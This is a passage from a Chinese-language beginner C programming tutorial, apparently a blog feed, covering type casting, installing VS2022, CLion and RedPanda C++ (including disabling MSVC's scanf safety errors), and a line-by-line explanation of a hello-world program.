<code>/运算符</code>对于int变量,执行的叫做<code>整除</code></p><p>那么解决的办法也很简单,将a或b中的其中任何一个声明为double即可(或者两个都是double),此时,C语言会有一个”类型提升”,也就是说,其中那个精度较低的变量(int类型的那一个)会被提升为和另一个变量相同的精度更高的类型(double),此时,double类型的值就可以保留浮点:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> a = <span class="number">3</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">2</span>; <span class="comment">// 这里将a声明为double</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lf&quot;</span>, a / b); <span class="comment">// 注意此时需要用%lf来输出浮点数!!!</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923160409779.png" alt="image-20230923160409779" style="zoom:33%;" /><p>这里的”类型提升”实际上是一个<code>隐式类型转换</code>,顾名思义,C程序默默地将b提升为double,与之对应的,我们可以进行<code>显式类型转换(或者说强制类型转换)</code>,使用方式是在要提升的值前加一对小括号,括号内写要转换为的类型:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>,b = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lf&quot;</span>, (<span class="type">double</span>)a / b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此程序同样输出<code>1.500000</code></p><p>另外,我们可以连续进行使用:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>, b = <span class="number">2</span>, c = <span class="number">5</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a + b * c); <span class="comment">// 输出结果为13</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这里我们也能看出四则运算和其数学意义相同,乘除法的优先级依旧高于加减法,所以结果是13.</p><p>那么如果想要强制先运算<code>a+b</code>,我们加上小括号即可,同时小括号可嵌套使用!</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>, b = <span class="number">2</span>, c = <span class="number">5</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, (a + b) * c); <span class="comment">// 输出结果为25</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里涉及到<code>运算符的优先级</code>,同样,现在进行详细讲解还为时过早.</p><p>上一篇:<a href="../2023-09-19-bb3b8099b657/">c语言教程-2-环境搭建</a></p><p>下一篇:<a href="../2023-09-22-4ec96a183bec/">c语言教程-4-顺序执行和语句</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-2-环境搭建</title>
      <link href="/2023-09-19-bb3b8099b657/"/>
      <url>/2023-09-19-bb3b8099b657/</url>
      
        <content type="html"><![CDATA[<h1 id="C语言编译环境需要什么"><a href="#C语言编译环境需要什么" class="headerlink" title="C语言编译环境需要什么"></a>C语言编译环境需要什么</h1><p>​我们知道,C语言是编译型语言,所以需要编译器来进行特定环境下的编译,如果你的C代码写的有较高的兼容性,亦或跨平台性强,那么无论是在什么架构&#x2F;操作系统下进行编译都能得到良好稳定的结果.</p><p>​无论是在Linux,Windows,macos或者是大多数人接触不到的UNIX,都有各自的编译器可供使用.</p><p>​另一方面,我们其实很少直接使用单独的编译器进行编译,因为我们更希望将整个开发过程集成于一个大型的软件,更加方便,安装IDE(集成开发环境)就是我们实际上最常用的方式.当然,你也可以找一个你喜欢的文本编辑器去编写代码,然后在控制台中输入命令进行手动编译生成可执行文件.</p><p>​所以我接下来讲解的基本都是IDE的安装,那么至于编译器工具链的安装会在其中穿插讲解.</p><h1 id="Windows平台"><a href="#Windows平台" class="headerlink" title="Windows平台"></a>Windows平台</h1><p>​学习编程最常用的平台还是Windows,并且现在基本都是64位的系统,所以并不存在32位的限制.</p><p>​Windows平台有许多软件可供使用,例如Visual Studio(vS),Visual C++(VC++),DEV-C++,CLion,VSCode等等都可以选择,我个人从一个初学者的角度出发,推荐使用VS,CLion,或者小熊猫C++这3款.</p><h2 id="VS2022的安装"><a href="#VS2022的安装" class="headerlink" title="VS2022的安装"></a>VS2022的安装</h2><p>​VS2022是微软的一款IDE,他可以进行包括但不限于C,C++,Python等等的各种语言的开发,号称宇宙第一IDE(功能极其强大),我作为一名使用C的学生,最让我觉得舒服的地方就是他的调试功能,VS的调试功能可以说是非常强大,这一点上CLion就显得比较弱势.但是,<del>VS有点丑</del>.而且文件太多,新手很容易被搞得晕头转向的,默认情况你只能在一个项目包含一个程序,而不能在一个项目里编写多个程序,这也是许多新手常常遇到的问题.</p><h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤:"></a>安装步骤:</h3><p>1.下载安装包</p><p>​下载community版本!下载community版本!下载community版本!重要的事情说三遍,VS社区版不收费!!!</p><p>​请认准官网,不要下载到盗版的什么安装助手.<a href="https://visualstudio.microsoft.com/zh-hans/vs/">https://visualstudio.microsoft.com/zh-hans/vs/</a></p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919185951583.png" alt="image-20230919185951583"></p><p>2.下载后直接运行,等待初始化完成后进行选择,由于我已经安装过所以显示的是修改,实际要点安装community版</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919190144768.png" alt="image-20230919190144768"></p><p>3.点击安装后只在工作负荷中选择”使用C++的桌面开发”,其他的什么都不用管!</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919190249856.png" alt="image-20230919190249856" style="zoom:50%;" /><p>4.然后如果你有D盘,并且空间足够的话,最好点击安装位置,将所有你能看到的路径全部由C:\改成D:,因为VS比较庞大,放C盘容易炸.</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919190426282.png" alt="image-20230919190426282"></p><p>5.然后右下角点击安装即可.</p><p>安装完成后关闭安装工具,就可以直接开始使用了,VS默认使用MSVC编译器,所以你无需再另外安装编译器.</p><h3 id="测试是否安装成功"><a href="#测试是否安装成功" class="headerlink" title="测试是否安装成功"></a>测试是否安装成功</h3><p>打开VS2022软件,我们就可以创建第一个项目,来编写一个hello world程序,这时你最好要提前想好你的代码都要存到哪里,方便找到,或者你实在不会就选默认也行.</p><p>​点击创建新项目:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919190741202.png" alt="image-20230919190741202" style="zoom:50%;" /><p>​选择”控制台应用”或者”空项目”,注意一定要确保标签写着C++而不是其他语言.</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919190855983.png" alt="image-20230919190855983"></p><p>​接着项目名和解决方案名随便你起,例如test1就可以:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919191040111.png" alt="image-20230919191040111" style="zoom:50%;" /></p><p>如果你选择的是控制台应用,那么VS会默认给你创建一个main.cpp,无需你进行创建,如果你选择的是空项目,那么还需要手动添加一个源文件—在左侧的解决方案资源管理器中右键”源文件”文件夹,点击添加-&gt;新建项,然后可以创建一个main.cpp:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919191305052.png" alt="image-20230919191305052" style="zoom:50%;" /><p>这时候一个项目就完全创建好了,你可以在main.cpp中进行编写代码,例如:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919191416465.png" alt="image-20230919191416465"></p><p>此外,我的VS因为之前设置过主题和配色,比默认的好看多了,你如果想美化请自行百度&#x2F;必应&#x2F;谷歌.</p><p>运行代码,点击上方的绿色的”播放”按钮即可:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919191534004.png" alt="image-20230919191534004"></p><p>如果程序正常运行,那么恭喜你,你的VS2022已经成功安装.</p><h3 id="注意事项-必须看"><a href="#注意事项-必须看" class="headerlink" title="注意事项(必须看)"></a>注意事项(必须看)</h3><p>另外,要注意的一点就是,VS默认是进行C++的开发,所以你会发现后缀都是.cpp,你改成.c也可以.还有很重要的一点就是,msvc(或者说VS这个IDE)默认是不允许使用scanf等函数的,因为他认为这些函数并不安全(具体原因以后解释,涉及到越界&#x2F;栈溢出的问题),所以转而要求你使用scanf_s等函数来代替,报错如图:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919192737049.png" alt="image-20230919192737049"></p><p>报错是英文的:<code>&#39;scanf&#39;: This function or variable may be unsafe.</code>,所以英语也要多少会一点,不至于连报错提示都看不懂.</p><p>但是,我想说一句话:</p><p><code>学习过程中你可以犯错,让编译器去迁就你,但是如果你要去因为一个编译器的特殊性,你要去迁就编译器,那你这学的就一塌糊涂</code></p><p>我们学C,首先要学的就是标准C,至少也得是ANSI C,不过2023年了,我们至少要学习C99的标准.</p><p>scanf_s等函数是在C11才出现的,目前各大编译器的支持度不高,而且scanf_s和scanf的使用方法也并不相同,所以,一句话,不要使用scanf_s.</p><p>注:解决的是<code>错误</code>,即使用scanf编译会报错,而警告<code>scanf的返回值被忽略</code>不仅仅是VS会警告,其他软件也会警告,这是一个良好的警告,但我们无需关心—scanf的返回值确实有用,但是简单的程序用不到.</p><p>那么为了在VS中正常使用scanf等函数,我们有三种解决办法:</p><h4 id="方法1-关闭SDL检查"><a href="#方法1-关闭SDL检查" class="headerlink" title="方法1:关闭SDL检查"></a>方法1:关闭SDL检查</h4><p>SDL(Security Development Lifecycle)，安全开发生命周期检查，微软在VS2012新推出的东西，为了能更好的监管开发者的代码安全，如果勾选了这一项则将严格按照SDL的规则编译代码，会有一些以前常用的函数无法通过编译。</p><p>我们只需要把项目的SDL检查关闭即可,<code>注意:每次新建项目都需要进行处理,包括下面的其他方法!</code></p><p>在菜单栏依次点击 项目-&gt;[你的项目名]属性,打开属性窗口,再次点击 配置属性-&gt;C&#x2F;C++-&gt;常规-&gt;SDL检查:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928163054328.png" alt="image-20230928163054328" style="zoom:33%;" /><p>将SDL检查从<code>是</code>修改为<code>否</code>即可.</p><h4 id="方法2-为项目添加-CRT-SECURE-NO-DEPRECATE预处理器定义"><a href="#方法2-为项目添加-CRT-SECURE-NO-DEPRECATE预处理器定义" class="headerlink" title="方法2:为项目添加_CRT_SECURE_NO_DEPRECATE预处理器定义"></a>方法2:为项目添加<code>_CRT_SECURE_NO_DEPRECATE</code>预处理器定义</h4><p>在菜单栏依次点击 项目-&gt;[你的项目名]属性,打开属性窗口,再次点击 配置属性-&gt;C&#x2F;C++-&gt;预处理器-&gt;预处理器定义:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919192447314.png" alt="image-20230919192447314" style="zoom: 33%;" /><p>在结尾先添加一个<code>;</code> ,然后输入<code>_CRT_SECURE_NO_DEPRECATE</code>这一段,点击保存,这时,回到你的包含scanf的程序,再次运行,即可正常:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919193040954.png" alt="image-20230919193040954" style="zoom: 33%;" /><h4 id="方法3-在每个源文件开头添加一行代码-define-CRT-SECURE-NO-WARNINGS-1即可"><a href="#方法3-在每个源文件开头添加一行代码-define-CRT-SECURE-NO-WARNINGS-1即可" class="headerlink" title="方法3:在每个源文件开头添加一行代码:#define _CRT_SECURE_NO_WARNINGS 1即可:"></a>方法3:在每个源文件开头添加一行代码:<code>#define _CRT_SECURE_NO_WARNINGS 1</code>即可:</h4><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919193744735.png" alt="image-20230919193744735" style="zoom:33%;" /><p>到此为止,VS2022的基本安装结束,以后遇到任何问题,请不要吝惜你的浏览器,先去网上找解决方案,一搜一大把.</p><h2 id="CLion的安装"><a href="#CLion的安装" class="headerlink" title="CLion的安装"></a>CLion的安装</h2><p>​有句玩笑话:”VS对C语言的支持是充话费送的”,确实VS其实是用于编写C++的,但是因为C++和C的关系,也是支持C的,不过可能支持的不是那么好…</p><p>​而Clion就是Jetbrain家专门为C&#x2F;C++设计的IDE,可以说目前常用的IDE中对C语言支持度最高的就是CLion了,但是他的弱点就是启动速度可能比VS还慢…貌似是java写的软件…而且启动后比VS还要占内存空间…</p><p>​但是…现在的笔记本电脑卷的一批,随便五六千的电脑都能带起一些3a大作游戏,那么带这些IDE那不是轻轻松松?所以别管那么多,用就完事了,如果你觉得VS实在不好用,或者嫌VS丑,欢迎试试CLion,我个人还装了一个彩色括号的插件,而且配色主题都是自己定制的,随心所欲:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919202458092.png" alt="image-20230919202458092"></p><p>不过,Clion有个问题就是…他收费…但是…大家很多都是学生在学C语言吧…Jetbrain是有针对大学生的学生认证的,可以直接免费使用,具体认证方式请自行百度,非常容易.当然,还有一种方式那就是pojie…</p><p>​总之,这里仅介绍CLion的安装</p><h3 id="安装步骤-1"><a href="#安装步骤-1" class="headerlink" title="安装步骤:"></a>安装步骤:</h3><p>1.找到官网下载professional版本即可,一路默认正常安装即可,遇到注册码先点击试用,然后去进行学生认证.</p><p>2.安装编译器</p><p>​首先你可以自行安装MinGW-w64工具链(也就是之前说的独立的编译器,里面包含了gcc等所有工具)</p><p>​或者可以从CLion中下载:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919195419921.png" alt="image-20230919195419921" style="zoom: 50%;" /></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919195801517.png" alt="image-20230919195801517"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919200413303.png" alt="image-20230919200413303"></p><p>总之你要安装并配置好MinGW这个工具链才行,很简单的.</p><p>自己配置和从Clion下载是一样的.</p><p>安装好后你就已经完成了,和VS不同,CLion默认使用CMake来管理项目,而且支持一个项目中单个文件的编译执行:</p><h3 id="单文件的编译运行"><a href="#单文件的编译运行" class="headerlink" title="单文件的编译运行"></a>单文件的编译运行</h3><p>点击main函数头左侧的绿色按钮,点击运行便可直接运行单个文件:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919200730155.png" alt="image-20230919200730155"></p><p>运行结果如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919200839316.png" alt="image-20230919200839316" style="zoom:33%;" /><p>测试成功.</p><p>到此为止,CLion的安装结束,具体使用可以去了解CMake的使用,基本的语法非常简单,可以自行百度.</p><h2 id="小熊猫C-的安装"><a href="#小熊猫C-的安装" class="headerlink" title="小熊猫C++的安装"></a>小熊猫C++的安装</h2><p>​官网:<a href="https://royqh.net/redpandacpp/">https://royqh.net/redpandacpp/</a></p><p>​小熊猫C++就是修改后的DEVC++,比devc++好用的多,而且支持最新的gcc12:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919201029204.png" alt="image-20230919201029204"></p><p>安装非常简单,百度找到官网下载自带编译器的版本进行安装即可.</p><p>至于MacOS,我没用过,所以没法写教程,大多可能使用VSCode或Xcode.</p><p>Linux,使用终端手动调用gcc进行编译,可以装一个文本编辑器来使用,例如Sublimetext4.</p><p>​—WAHAHA,2023.9.19</p><p>上一篇:<a href="../2023-09-19-a9f92809d221/">c语言教程-1-什么是程序</a></p><p>下一篇:<a href="../2023-09-20-c8dccef8fb72/">c语言教程-3-数据类型</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-1-什么是程序</title>
      <link href="/2023-09-19-a9f92809d221/"/>
      <url>/2023-09-19-a9f92809d221/</url>
      
        <content type="html"><![CDATA[<h1 id="C语言概述"><a href="#C语言概述" class="headerlink" title="C语言概述"></a>C语言概述</h1><h2 id="编程语言与算法"><a href="#编程语言与算法" class="headerlink" title="编程语言与算法"></a>编程语言与算法</h2><p>​    首先，关于C语言的历史发展，您应该去书上找到答案，而不是在这里快速浏览的一带而过。</p><p>​    那么，C语言是属于一门编程语言，而且是属于一种高级语言（代码是接近自然语言的表述），但同时由于其独特的指针等特性，说他是中级语言也不为过。作为编程语言，其作用自然是显而易见—用于描述算法。</p><p>​    我个人不愿意把算法这个东西神秘化，很多东西都能叫算法，大到一个高级的数学问题求解，小到如何做出一道菜，都可以成为“算法”。我不愿意去搬一些砖头书的标准概念—我这也算是感想笔记，简单来说，算法有三个要素：前提条件，目的，过程。</p><p>​    前提条件，就是完成一个算法的要求。例如做一道菜，你需要准备的食材，工具；计算a+b&#x3D;c这个算法，你需要给我提供a，b这两个数。</p><p>​    目的，就是这个算法到底要干什么。例如我要做出一道菜；我要算出a+b的和c这个数。</p><p>​    过程，就是到底如何操作。例如我要切菜，煮菜，调味等等；我要把a和b做一个竖式计算。</p><p>​    以上都完备，且确认均正确无误，就可以成为一个完整的算法。也就是说，甚至一个windows操作系统某种程度上也可以说是一个算法—我有机器设备，能源，数据来源；我要用于计算&#x2F;为用户提供服务；我有自己的底层逻辑来完成以上所有的功能。</p><p>​    那么，想要描述一个算法，就要用到专门的记录语言—编程语言，那么C语言就是其中的独特的一种。</p><h2 id="C语言的特点"><a href="#C语言的特点" class="headerlink" title="C语言的特点"></a>C语言的特点</h2><p>​    编程语言有一些特点：</p><p>​静态(C,JAVA,C++等)&#x2F;动态类型(Python,JavaScript等)语言</p><p>​弱类型(VB)&#x2F;强类型(C,JAVA,C++,Python)语言</p><p>​编译型(C,C++,RUST)&#x2F;解释型(Python&#x2F;JavaScript)&#x2F;介于两者之间的(JAVA)语言</p><p>​面向过程(C,FORTRAN)&#x2F;基于对象(JavaScript)&#x2F;面向对象(Python,JAVA)&#x2F;既可面向对象也可面向过程(C++)语言</p><p>​其中,C语言的特性如上所述。具体都是什么意思请百度，不知道也没有关系，学到其他语言自然就能体会巨大的差异了。</p><p>​C语言的强类型，静态类型我个人认为不容易出错，但是相对的缺少灵活性（尽管C本身以灵活著称）。毕竟是一门古老，极其精简的语言了。你会发现，越发复杂，支持各种高级操作的语言，其底层代码就更加复杂，而C语言如此精简，势必会显得单薄—除非是有别人写好的库，不然你都得自己重头写起。</p><p>​作为一门老语言，当然只支持面向过程，同时也支持函数式编程（一定程度上模块化），学C，就不要羡慕其他语言，如果你真的羡慕，那么你干嘛要选择C呢？</p><h1 id="C语言是如何运作的"><a href="#C语言是如何运作的" class="headerlink" title="C语言是如何运作的"></a>C语言是如何运作的</h1><h2 id="C代码是怎么样的"><a href="#C代码是怎么样的" class="headerlink" title="C代码是怎么样的"></a>C代码是怎么样的</h2><p>​我们上一个最简单，最经典的代码—Hello World！程序，作为经典的入门代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这是一段注释---这是一个hello world程序</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 这是一行注释</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> <span class="comment">//包含一个头文件stdio.h,其中</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;<span class="comment">// 这是一个函数,而且是C程序的入口,一切必须从这里开始执行</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, World!\n&quot;</span>); <span class="comment">// printf是一个函数,用于输出一个字符串,这里输出&quot;Hello World！&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面将程序拆解为几块来分别进行讲解:</p><h3 id="头文件包含-include-lt-stdio-h-gt"><a href="#头文件包含-include-lt-stdio-h-gt" class="headerlink" title="头文件包含#include&lt;stdio.h&gt;"></a>头文件包含#include&lt;stdio.h&gt;</h3><p>作为描述算法的语言，与过程不可分割，一个大型算法中会包含许多小操作，这些小操作甚至也是一些子算法，整个算法分为几个不同的步骤去进行，其中一些最基本的不可或缺的操作&#x2F;已经开发好的算法&#x2F;处理操作就没有必要再去手动重新编写，也就是说别人已经造好了轮子，你先拿来用就行。也就是说C语言也有许多写好的“库”可以直接使用，我们想要使用它们，一般（不是绝对）都要加上库自带（提前写好的）的“导入信息”，C语言中称为<strong>头文件</strong>。实际上，头文件包含了许多函数&#x2F;自定义类型等元素的声明（后面说明），想要使用某个函数，那么必须让编译器知道我导入了这个函数（事先声明好）。</p><h3 id="主函数main"><a href="#主函数main" class="headerlink" title="主函数main()"></a>主函数main()</h3><p>无规矩不成方圆，一个程序必须有管事的老大，一切运算必须从main()函数开始(也就是主函数),无论执行什么函数,都必须从main()中开始调用或者由其他函数进行进一步的调用。</p><p><code>int main()</code>叫做main函数的<code>函数头</code>,它包含了这个函数的基本信息—函数的名称,需要传递的参数,函数的返回值类型.c语言的函数和数学意义上的函数完全等价,例如f(x)&#x3D;x+1,其中x为整数 这个函数就可以写为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123; <span class="comment">// int 代表x为整型变量(保存整数)</span></span><br><span class="line">    <span class="keyword">return</span> x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​最后,函数头后面紧跟的就是函数体,函数体里包含了这个函数的一切操作,函数体以{}作为边界.</p><h3 id="函数内的语句"><a href="#函数内的语句" class="headerlink" title="函数内的语句"></a>函数内的语句</h3><p>一个函数中包含的所有内容就是这个函数要执行的运算,还有一些辅助的&#x2F;必要的数据(局部变量或函数参数),每一个操作叫做一条语句,语句必须由一个;来结束,一个语句可复杂可简单,一条语句由若干个表达式构成,表达式越多,越复杂冗长,这条语句就越复杂。所以，如果可以，尽可能把一个复杂的操作分成几条语句（几步分开的操作）来运算。</p><p>​例如<code>printf(&quot;Hello, World!\n&quot;);</code>这条语句就是执行了一个输出字符串的操作，其中只包含了一个表达式—函数调用表达式—调用了printf()这个函数. </p><p>​<strong>注意:大部分入门教程绝对不会提到”函数调用表达式”这个概念,请以我的说法为准!从来没有”函数调用语句”这个东西!</strong></p><p>​<strong>C语言的大部分语句是由表达式构成的!</strong></p><p>​再例如<code>return 0;</code>这条语句就是执行了一个函数返回的操作,任何函数,一旦执行到return语句,即意味着这个函数的执行立即结束,后面的代码无论多少都不会再继续执行,直接返回.return后面跟着的那个值也是一个表达式,可以放置任意和函数类型符合的,可以求值的表达式,此处main函数默认返回一个0,0就是一个值为0的常量表达式.</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们可以发现,一般情况下,一个完整c程序必须或应该包含以下几个部分:</p><p>1.使用<code>#include&lt;&gt;</code>命令进行头文件的包含,不同的头文件内包含了我们这个程序可能用到的各种函数等的信息</p><p>​例如我们用于输出的<code>printf()</code>函数就在stdio.h这个头文件内</p><p>2.一个必须存在的函数,他是一切的开始—int main()函数</p><p>​一个最规范正确的main函数的格式应该是这样:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line"><span class="comment">//其他语句</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​我们最多可以把那个括号中的void省略,因为main中的void是在新标准中推荐添加的,我们基于C99版本进行学习即可.</p><p>​另外,一切教导你这样写main函数的教材或书,请你扔掉它:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">main()&#123;</span><br><span class="line"><span class="comment">//main前面没有int</span></span><br><span class="line"><span class="comment">//其他语句</span></span><br><span class="line"><span class="comment">//没有return 0;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.其他过程,也就是其他的辅助函数,用于将功能独立出来</p><p>4.一些注释,用于标注这个程序是用来干什么的,或者某一段代码是干什么的</p><p>​注意:一定要养成写注释的习惯,特别是程序越发复杂,更应该编写注释来以备日后回看,方便改进和维护.</p><h3 id="警惕”烂书”教你的错误写法"><a href="#警惕”烂书”教你的错误写法" class="headerlink" title="警惕”烂书”教你的错误写法"></a>警惕”烂书”教你的错误写法</h3><p>之所以让你”扔书”,是想让你知道什么是该学的规范写法,什么是业余的写法:</p><p>1.只有旧标准才允许main前不加返回类型(也就是那个int).</p><p>2.此外,如果你发现有这么写的<code>void main()</code>,请毫不犹豫地把这本书扔掉,因为不加返回类型勉强可以说是对的,只不过是旧写法,但是唯独<code>void main()</code>,从来没有任何标准中写过这种写法是正确的.不信你可以在现在(2023年)找大众的编译器来编译,99%会报错.</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924183653567.png" alt="image-20230924183653567"><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924183730275.png" alt="image-20230924183730275" style="zoom:33%;" /></p><p>从这两张图可以看出至少<code>main()</code>没有报错.实际上,<code>main()</code>的写法没有报错是为了对老程序的兼容性—毕竟前面所述,这是一种旧的写法,而不是完全错误的写法.我们学习,就要写<code>int main()</code>,或者你想加void也行.</p><h2 id="C代码是如何成为计算机程序的"><a href="#C代码是如何成为计算机程序的" class="headerlink" title="C代码是如何成为计算机程序的"></a>C代码是如何成为计算机程序的</h2><p>​学习C语言,或者说学习编程,就是和计算机打交道,多少要了解一些计算机的原理,否则,你学的C语言永远是花架子,找不到精髓.</p><p>​我认为:一个计算机程序&#x3D;算法+数据结构,同时他们也有交叉,一个完备的算法应该考虑到对应的数据结构;一种特定的数据结构应该为一个或一系列算法服务.</p><p>​C代码,说到底还是一个文本文档,他只是记录了一个程序的逻辑,并不是一个可用的程序,那么作为一种编译型语言,想要把C源文件转换为可执行程序,就需要使用到专门的工具—C编译器(一切编译型语言都有自己的编译器,例如RUST有RUST自己的编译器),我们最常见的就是3种:GCC编译器,MSVC编译器,Clang编译器,我个人使用GCC来进行c代码的编译,他们大同小异,初学阶段无需考虑其差异,任何IDE都有对应的编译器可供使用.</p><p>​这里的C源文件就是例如hello.c这样的以.c为后缀的文本文档,实际上它和.txt没有任何区别.他并不是二进制的文件.C编译器做的工作就是”编译”,同时这个”编译”实际上包含了许多操作:”预处理”-&gt;”编译”-&gt;”汇编”-&gt;”链接”,最终链接完成后才是最终的可执行文件,这里的知识点暂时没什么用,可以自行了解.你只需知道,源文件经过编译后才能成为真正的二进制程序用于运行.</p><p>​一旦成为计算机程序,就和语言无关了,因为二进制程序是和系统架构严格相关的,RUST编译出来的程序,C++编译出来的程序,C编译出来的程序,都是给同一个系统使用的,也就是说,不管内部细节的话,某种程度上他们已经是和语言无关了.</p><h2 id="我们学了C语言是要干什么"><a href="#我们学了C语言是要干什么" class="headerlink" 